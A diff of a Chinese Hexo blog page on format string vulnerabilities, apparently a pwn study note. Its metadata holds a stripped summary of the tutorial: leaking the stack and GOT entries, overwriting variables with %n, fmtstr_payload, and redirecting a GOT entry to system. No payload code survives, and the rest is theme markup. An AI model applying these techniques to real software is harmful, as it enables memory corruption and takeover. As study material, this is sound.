@@ -1,487 +1,817 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-
-
-
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-  <meta name="author" content="John Doe">
-
-
-
-
-
-<title>格式化字符串 | Hexo</title>
-
-
-
-<link rel="icon" href="/favicon.png">
-
-
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
-
-
-
-<script src="/lib/jquery.min.js"></script>
-
-
-<script src="/lib/iconify-icon.min.js"></script>
-
-
-<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
-<script>
-  tailwind.config = {
-    darkMode: "class",
-  };
-</script>
-
-
-<script src="/lib/nprogress/nprogress.js"></script>
-
-<script>
-  $(document).ready(() => {
-    NProgress.configure({
-      showSpinner: false,
-    });
-    NProgress.start();
-    $("#nprogress .bar").css({
-      background: "#de7441",
-    });
-    $("#nprogress .peg").css({
-      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
-    });
-    $("#nprogress .spinner-icon").css({
-      "border-top-color": "#de7441",
-      "border-left-color": "#de7441",
-    });
-    setTimeout(function () {
-      NProgress.done();
-      $(".fade").removeClass("out");
-    }, 800);
-  });
-</script>
-
-<script>
-  (function () {
-    const prefersDark =
-      window.matchMedia &&
-      window.matchMedia("(prefers-color-scheme: dark)").matches;
-    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
-    if (setting === "dark" || (prefersDark && setting !== "light"))
-      document.documentElement.classList.toggle("dark", true);
-    let isDark = document.documentElement.classList.contains("dark");
-  })();
-
-  $(document).ready(function () {
-    // init icon
-    const prefersDark =
-      window.matchMedia &&
-      window.matchMedia("(prefers-color-scheme: dark)").matches;
-    const isDark = document.documentElement.classList.contains("dark");
-    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
-
-    function toggleGiscusTheme() {
-      const isDark = document.documentElement.classList.contains("dark");
-      const giscusFrame = document.querySelector("iframe.giscus-frame");
-      if (giscusFrame) {
-        giscusFrame.contentWindow.postMessage(
-          {
-            giscus: {
-              setConfig: {
-                theme: isDark ? "dark" : "light",
-              },
-            },
-          },
-          "https://giscus.app"
-        );
-      }
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>格式化字符串 | Hexo</title><meta name="keywords" content="pwn_study"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="格式化字符串"><meta name="application-name" content="格式化字符串"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="格式化字符串"><meta property="og:url" content="http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。 通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。 一般来说，格式化字符串在利用的时候主要分为三个部分： (1）格式化字符串函数。 (2）格式化字符串。 (3）后续参数"><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="John Doe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="原理格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。 通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。 一般来说，格式化字符串在利用的时候主要分为三个部分： (1）格式化字符串函数。 (2）格式化字符串。 (3）后续参数"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: John Doe","link":"Link: ","source":"Source: Hexo","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
     }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Hexo',
+  title: '格式化字符串',
+  postAI: '',
+  pageFillDescription: '原理, 🧱 常见的格式化字符串符号, 利用, leakmemory(泄露栈上内容), leakmemory(泄露任意地址内存), 脚本, 函数调用完整过程, overwrite(覆盖任意地址内存), a的处理（局部变量）, b的处理（全局小数）, c的处理（全局大数）, fmtstr_payload, fmt_demo（格式化字符串的综合利用）原理格式化字符串函数可以接受可变数量的参数并将第一个参数作为格式化字符串根据它解析之后的参数通俗来说格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式一般来说格式化字符串在利用的时候主要分为三个部分格式化字符串函数格式化字符串后续参数可选用函数叫作格式化字符串函数叫作格式化字符串叫作后续参数常见的格式化字符串符号格式符作用示例以十六进制形式输出栈上的值通常带前缀以十进制输出栈上的值输出栈上值的最低一个字节把栈上的值当作地址输出该地址的字符串写入字节写入低字节写入字节写入低字节将已输出字符数写入栈上的地址写入到指定地址指定第几个参数位置的值第个参数输出一个字符本身当用户控制了的第一个参数即格式化字符串而程序没有进行过滤或限制就可能造成以下问题危险用户输入直接作为格式化字符串此时攻击者可以构造输入如程序会尝试从栈中读取参数但由于没有提供参数列表会继续从栈中猜测数据这可能导致泄露栈内存内容如返回地址函数指针等写入内存通过格式符虽然没有写任何参数但还是会对应地解析参数因为在格式化字符串中写了对应的解析方式所以在后续的函数运行中会解析栈上的元素对于整型值和浮点值这没有什么问题不管栈上是什么数据都能够按照整型值和浮点值解析出来而字符串形式就不一定能解析出来了如果是一个非法地址比如那么在解析的时候就会报错因为这个地址按照字符串解析是无法解析出来的程序就会崩溃这就是格式化字符串漏洞的基本原理利用泄露栈上内容用了来防止缓冲区溢出但并没有限制用户输入的格式符内容也就是说用户可以输入等格式符会根据这些格式符从栈中猜测数据从而造成信息泄露或任意地址写入泄露任意地址内存这里的目标设立泄露函数编译之后是在内存中的地址这里的是可以更换的比如更换为就可以解析栈上的数据为字符串表示要打印的参数距离目前格式化字符串参数的距离因为在没有给提供对应的字符但它是一个可变参数函数它会从栈上依次读取数据来填充格式化字符串中的等指令但你并不知道你输入的字符串在栈上的具体位置所以你需要找到你的输入字符串在栈上的偏移量才能精准控制读写的内容所以偏移量就是所以构造相当于所以前四个字节是输出的的表关键区别地址地址的内容表中的地址段中的一个位置就像书的目录页码泄露的地址这个表项中存储的值即的实际地址就像目录页码指向的那一页的内容脚本执行流程会从栈上读取参数它看到会从第个参数位置读取一个地址这个地址是你写入的地址然后从地址中读出一个指针比如即的运行时地址会从开始读取字符串直到遇到最终你接收到的数据中包含总结和一样吗不一定取决于编译器为什么会有编译器为了支持标准引入的怎么确认用哪个用或查看表能不能替换只有表中存在对应符号时才能替换如果写错了会怎样报错函数调用完整过程阶段在里调用之前这是已经在里且栈帧已经建立好了栈顶在栈低在高地址方向高地址参数可能是命令行参数参数参数返回地址上一个的局部变量在里低地址当你刚进入上一个返回地址返回到的局部变量最低处指向局部变量阶段调用当调用调用者把返回地址参数压入栈高地址参数的参数返回地址上一个局部变量参数返回地址下一条此时指向的返回地址再往上是的参数阶段进入后在开始执行后它建立自己的栈帧高地址参数的参数返回地址上一个局部变量参数返回地址下一条上一个局部变量这里把当前的压栈把设置为再向下留出局部变量空间函数会把读取到的数放在栈上一个空间然后会把它泄露出来使用读取一个字符串最多字节存入缓冲区然后直接将这个字符串作为参数传给即覆盖任意地址内存所以这道题的重点是修改几个数的值将覆盖为将覆盖为将覆盖为其中是局部变量是全局变量局部变量存储在栈上全局变量存储在数据段中分为已初始化和未初始化两部分高内存地址命令行参数环境变量栈局部变量函数参数返回地址局部变量返回地址等局部变量返回地址等局部变量返回地址等空闲堆动态分配内存段未初始化数据未初始化的全局变量和静态变量例如段已初始化数据已初始化的全局变量和静态变量例如段代码程序执行代码指令保留区域低内存地址的处理局部变量首先是局部变量局部变量是存储在栈上的其地址会因为开启而变化所以在函数中将的地址打印出来了脚本和函数接收到的是字符串形式的地址如转换为整数地址主动泄露地址接收到的是原始字节数据如将小端序的字节转为整数调用泄露地址是怎么用的构造的会被当作一个参数处理它被压入栈上会从第个参数位置读取它这个地址就是写入的目标地址是怎么用的目标是的地址占四个字节输出个字符如空格会把当前输出的字符总数写入指定地址所以的作用是让写入它本身不写入内存但会影响的值不能换成这个不会影响的总数工作原理当执行时字符串会被放到栈上开始解析它会把视为一个普通的字符串但它实际上是的地址然后遇到它输出个字符接着遇到此时已经输出了个字符它会去栈上寻找第个参数的地址由于放在了的开头并且其长度是字节它会正好落在栈上第个参数的位置上这个偏移量是经过调试确定的会将当前已输出的字符数写入到所表示的地址也就是局部变量的地址最终的值被修改为的处理全局小数的地址可以直接找到脚本为什么不能按照覆盖的方法因为的地址已经超过了所以的地址只能在之后偏移量计算的差异在覆盖的方法中放在了的最开头并且发现这个开头在它的参数列表中是第个但是如果将也放在的开头并尝试用写入可能会遇到问题地址值与格式符冲突这个地址本身如果被解析成格式化字符串的一部分可能会包含或其他特殊字符导致崩溃或行为异常例如地址的某个字节可能被解释为或的一部分导致试图读取无效的内存地址控制性问题我们通常希望将要写入的地址放在格式字符串的末尾这样它就不会被误认为是格式符的一部分来处理而只是一个普通的字节数据特性覆盖局部变量覆盖全局变量目标类型栈上的局部变量数据段上的全局变量地址来源运行时泄露每次可能不同静态固定编译时确定位置放在的开头放在的末尾偏移因为地址放在开头且在第个参数位置因为地址放在末尾且在第个参数位置主要考量确保不被误解为格式符且在正确偏移避免字节被误解为格式符更稳定地作为参数地址好的如果你确认这个是必须的那么它在中的存在就意味着它在栈的布局和对参数的解析中起到了关键作用通常是保证了的正确对齐使其落在预期的参数位置让我们来详细分析为什么多一个反而可能成为必须的有的详细分析让我们计算每个部分的长度字节字节字节字节假设是总字节数字节在这里是为了补足字节的处理全局大数这是一个很大的数考虑逐字节写入这里想把覆盖为而的地址是所以基本目标是脚本是提供的一个自动化工具用于构造格式化字符串漏洞的它的作用是自动计算字符数并构造用于写入任意地址的值如表变量返回地址等的使用方法基本语法参数说明格式化字符串偏移量你的输入在第几个的位置一个字典表示你要写入的地址和值如已经输出的字符数默认为可以忽略写入大小可选默认是示例写入一个地址为偏移量假设你要写入变量的地址构造写入示例写入多个地址如构造写入多个地址格式化字符串的综合利用所以可以先泄露的基址得到函数的地址太根据此把的表存储的地址换为函数的地址之后输入参数就可以实现脚本那为什么还要填补的长度为字节我们来从被复制到栈上这个现象出发解释为什么我们有意地将填充到固定长度如字节尽管它可能会被复制到栈上简短回答我们填补到固定长度如字节是为了让被完整复制到栈上从而让偏移固定布局可控便于利用格式化字符串漏洞进行地址泄露或写入操作的两种命运短一些参数长度从栈上读取参数在中参数在栈上长一定长度如字节把复制到栈上本身就在栈上为什么要故意让被复制到栈上优点一偏移固定便于调试被复制到栈上后它在栈上的位置是固定的我们可以精准控制偏移比如就一定读取中的地址避免了因长度不同导致偏移变化的问题优点二便于构造写入操作如当我们想用写某个地址时需要确保地址在栈上且偏移固定如果被复制到栈上我们就可以把地址放在开头然后用精准写入优点三防止被截断或偏移漂移如果长度不固定可能导致偏移变化读写错误地址填充到固定长度如可以避免这种漂移但我其实不太理解',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-21 21:35:26',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    // toggle dark mode
-    function toggleDark() {
-      let isDark = document.documentElement.classList.contains("dark");
-      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
-      isDark = !isDark;
-      document.documentElement.classList.toggle("dark", isDark);
-      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
-      if (prefersDark === isDark) {
-        localStorage.setItem("hexo-color-scheme", "auto");
-      } else {
-        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
-      }
-      toggleGiscusTheme();
-    }
-
-    // listen dark mode change
-    window
-      .matchMedia("(prefers-color-scheme: dark)")
-      .addEventListener("change", (e) => {
-        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
-        if (setting === "auto") {
-          document.documentElement.classList.toggle("dark", e.matches);
-          $("#theme-icon").attr(
-            "icon",
-            e.matches ? "ri:moon-line" : "ri:sun-line"
-          );
-          toggleGiscusTheme();
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
         }
-      });
-
-    $("#toggle-dark").click((event) => {
-      const isAppearanceTransition = document.startViewTransition && !window.matchMedia('(prefers-reduced-motion: reduce)').matches
-      if (!isAppearanceTransition) {
-        toggleDark()
-        return
       }
-      const x = event.clientX
-      const y = event.clientY
-      const endRadius = Math.hypot(
-        Math.max(x, innerWidth - x),
-        Math.max(y, innerHeight - y),
-      )
-      const transition = document.startViewTransition(async () => {
-        toggleDark()
-      })
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-      transition.ready
-        .then(() => {
-          const isDark = document.documentElement.classList.contains("dark")
-          const clipPath = [
-            `circle(0px at ${x}px ${y}px)`,
-            `circle(${endRadius}px at ${x}px ${y}px)`,
-          ]
-          document.documentElement.animate(
-            {
-              clipPath: isDark
-                ? [...clipPath].reverse()
-                : clipPath,
-            },
-            {
-              duration: 400,
-              easing: 'ease-out',
-              pseudoElement: isDark
-                ? '::view-transition-old(root)'
-                : '::view-transition-new(root)',
-            },
-          )
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
         })
-    });
-  });
-</script>
 
-
-
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
-  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
-  <div class="max-auto">
-    <nav class="flex items-center text-base">
-      <a href="/" class="group">
-        <h2 class="font-medium tracking-tighterp text-l p-2">
-          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/avatar.jpg" alt="Hexo" />
-          Hexo
-        </h2>
-      </a>
-      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
-        格式化字符串
-      </div>
-      <div class="flex-1"></div>
-      <div class="flex items-center gap-3">
-        
-          <a class="hidden sm:flex" href="/archives">Posts</a>
-        
-          <a class="hidden sm:flex" href="/categories">Categories</a>
-        
-          <a class="hidden sm:flex" href="/tags">Tags</a>
-        
-        
-          
-        
-        <a class="w-5 h-5 hidden sm:flex" title="" href="rss2.xml">
-          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
-        </a>
-        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
-          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
-        </a>
-      </div>
-      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
-        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
-          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
-        </span>
-        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
-          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
-        </span>
-      </div>
-    </nav>
-  </div>
-</header>
-<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
-  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
-    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
-      
-        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
-          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
-        </li>
-      
-        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
-          <a href="/categories" class="flex h-12 sm:h-auto items-center">Categories</a>
-        </li>
-      
-        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
-          <a href="/tags" class="flex h-12 sm:h-auto items-center">Tags</a>
-        </li>
-      
-    </ul>
-  </div>
-  <div class="mask bg-black/20 absolute inset-0"></div>
-</div>
-
-  <main class="pt-14">
-    <!-- css -->
-
-<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
-
-
-<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
-
-<!-- toc -->
-
-<section class="px-6 max-w-prose mx-auto md:px-0">
-  <!-- header -->
-  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
-    <div class="pt-4 md:pt-6">
-      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
-        格式化字符串
-      </h1>
-      <div>
-        <section class="flex items-center gap-3 text-sm">
-          <span class="flex items-center gap-1">
-            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
-            <time>2025-07-21</time>
-          </span>
-          <span class="text-gray-400">·</span>
-          <span class="flex items-center gap-1">
-            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
-            <span>1 min</span>
-          </span>
-          <span class="text-gray-400">·</span>
-          <span class="flex items-center gap-1">
-            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
-            <span>0 words</span>
-          </span>
-          
-        </section>
-      </div>
-    </div>
-  </header>
-  <!-- content -->
-  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
-    
-  </article>
-  <!-- tag -->
-  <div class="mt-12 pt-6 border-t border-gray-200">
-    
-  </div>
-  <!-- prev and next -->
-  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
-    <div>
-      
-    </div>
-    <div>
-      
-        <a href="/2025/07/20/HarekazeCTF2019-baby-rop2/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          ret2libc-printf
-          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
-        </a>
-      
-    </div>
-  </div>
-  <!-- comment -->
-  <div class="article-comments mt-12">
-    
-
-  </div>
-</section>
-<!-- js inspect -->
-
-<script src="/lib/clipboard.min.js"></script>
-
-
-<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    "HTML-CSS": {
-        preferredFont: "TeX",
-        availableFonts: ["STIX","TeX"],
-        linebreaks: { automatic:true },
-        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
-    },
-    tex2jax: {
-        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
-        processEscapes: true,
-        ignoreClass: "tex2jax_ignore|dno",
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    },
-    TeX: {
-        equationNumbers: { autoNumber: "AMS" },
-        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
-        Macros: { href: "{}" }
-    },
-    messageStyle: "none"
-  });
-</script>
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Queue(function() {
-      var all = MathJax.Hub.getAllJax(), i;
-      for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-      }
-  });
-</script>
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
-<script>
-  $(document).ready(() => {
-    const maraidConfig = {
-      theme: "default",
-      logLevel: 3,
-      flowchart: { curve: "linear" },
-      gantt: { axisFormat: "%m/%d/%Y" },
-      sequence: { actorMargin: 50 },
-    };
-    mermaid.initialize(maraidConfig);
-  });
-</script>
-
-
-
-<script src="/lib/fancybox/fancybox.umd.min.js"></script>
-
-<script>
-  $(document).ready(() => {
-    $('.post-content').each(function(i){
-      $(this).find('img').each(function(){
-        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
-        var alt = this.alt;
-        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
-        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
-      });
-      $(this).find('.fancybox').each(function(){
-        $(this).attr('rel', 'article' + i);
-      });
-    });
-
-    Fancybox.bind('[data-fancybox="gallery"]', {
-        // options
-    })
-  })
-</script>
-
-<!-- tocbot begin -->
-
-<script src="/lib/tocbot/tocbot.min.js"></script>
-
-<script>
-  $(document).ready(() => {
-      tocbot.init({
-        // Where to render the table of contents.
-        tocSelector: '.post-toc',
-        // Where to grab the headings to build the table of contents.
-        contentSelector: '.post-content',
-        // Which headings to grab inside of the contentSelector element.
-        headingSelector: 'h1, h2, h3',
-        // For headings inside relative or absolute positioned containers within content.
-        hasInnerContainers: true,
-    });
-  })
-</script>
-<!-- tocbot end -->
-
-
-  </main>
-  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
-  <!-- busuanzi -->
-  
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<!-- Busuanzi Analytics -->
-<div class="flex items-center gap-2">
-  <span>Visitors</span>
-  <span id="busuanzi_value_site_uv"></span>
-  <span>Page Views</span>
-  <span id="busuanzi_value_site_pv"></span>
-</div>
-<!-- End Busuanzi Analytics -->
-
-
-  <!-- copyright -->
-  <div class="flex items-center gap-2">
-    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
-    <span>© 2022</span>
-    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
-    <a href="https://github.com/xbmlz" target="_blank" rel="noopener noreferrer">xbmlz</a>
-  </div>
-  <!-- powered by -->
-  <div class="flex items-center gap-2">
-    <span>Powered by</span>
-    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
-    <span>&</span>
-    <a href="https://github.com/xbmlz/hexo-theme-maple" target="_blank" rel="noopener noreferrer">Maple</a>
-  </div>
-
-</footer>
-
-  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
-    <span class="flex justify-center items-center text-sm">
-      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
-      <span id="scrollpercent"><span>0</span> %</span>
-    </span>
-  </div>
-  
-<script src="/js/main.js"></script>
-
-
-  <script>
-    $(document).ready(function () {
-      const mapleCount = "20";
-      const speed = "0.7";
-      const mapleEl = document.getElementById("maple");
-      const maples = Array.from({ length: mapleCount }).map(() => {
-        const maple = document.createElement("div");
-        const scale = Math.random() * 0.5 + 0.5;
-        const offset = Math.random() * 2 - 1;
-        const x = Math.random() * mapleEl.clientWidth;
-        const y = -Math.random() * mapleEl.clientHeight;
-        const duration = 10 / speed;
-        const delay = -duration;
-        maple.className = "maple";
-        maple.style.width = `${24 * scale}px`;
-        maple.style.height = `${24 * scale}px`;
-        maple.style.left = `${x}px`;
-        maple.style.top = `${y}px`;
-        maple.style.setProperty("--maple-fall-offset", offset);
-        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
-        maple.style.animation = `fall ${duration}s linear infinite`;
-        maple.style.animationDelay = `${delay}s`;
-        mapleEl.appendChild(maple)
-        return maple
+        document.head.appendChild(script)
       })
-    });
-  </script>
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
